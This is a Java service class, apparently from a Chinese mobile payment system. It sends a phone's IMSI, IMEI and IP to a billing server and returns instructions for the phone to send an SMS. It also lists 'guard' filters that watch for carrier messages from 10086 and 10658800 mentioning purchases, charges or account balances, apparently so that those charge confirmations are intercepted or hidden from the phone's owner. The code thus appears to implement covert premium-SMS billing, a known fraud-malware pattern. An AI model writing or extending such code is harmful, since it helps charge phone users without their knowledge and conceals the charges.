package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.Constants;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.qlzf.commons.helper.MD5Encrypt;

public class BjjsMm1DynamicService implements IDynamicService{

	private static final String TYPE = "bjjsMm1";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "companycode={companycode}&pid={pid}&statement={statement}&imsi={imsi}&imei={imei}&mobileip={mobileip}&sign={sign}";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String companycode = map.get("companycode");
			String pid = map.get("pid");
			String statement = companycode + channel.substring(5);
			String mobileip = map.get(Constants.IPPARAM);
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			String sign = MD5Encrypt.MD5Encode(companycode+imei);
			
			String param = REQUESTMODEL.replace("{companycode}",companycode).replace("{pid}",pid).replace("{statement}",statement).replace("{mobileip}",mobileip).replace("{imei}",imei).replace("{imsi}",imsi).replace("{sign}",sign);
			
			String responseJson = GetData.getData(url, param);
			
			xml = parse(responseJson);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parse(String responseJson){
		
		if(responseJson != null && responseJson.length() > 0){
			System.out.println(responseJson);
			
			try{
				JSONObject jo = new JSONObject(responseJson);
			
				String sendport = jo.getString("sendport");
				String sendcontent = jo.getString("sendcontent");
				
				if(sendport != null && sendport.length() > 0){
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(sendcontent);
					sms.setSmsDest(sendport);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
						
					return XstreamHelper.toXml(smsList);
				}
			}catch(Exception e){
				
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		//http://211.154.162.11/recYdmmAction.action?companycode=W1001&pid=ttddz20c&statement=W100120140529174&imsi=460021281243687&imei=863388028868466&mobileip=202.108.36.125&sign=F0B9CB8094C477E328043EBBB9787362
		
		String url = "http://211.154.162.11/recYdmmAction.action";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B101a087654321");
		map.put("companycode", "W1028");
		map.put("imei", "862949029214504");
		map.put("imsi", "460022101441340");
		map.put("pid", "jshy600");
		map.put(Constants.IPPARAM,"123.113.108.193");
		map.put("type", "bjjsMm1");

		
		System.out.println(new BjjsMm1DynamicService().dynamic(map));
	}

}
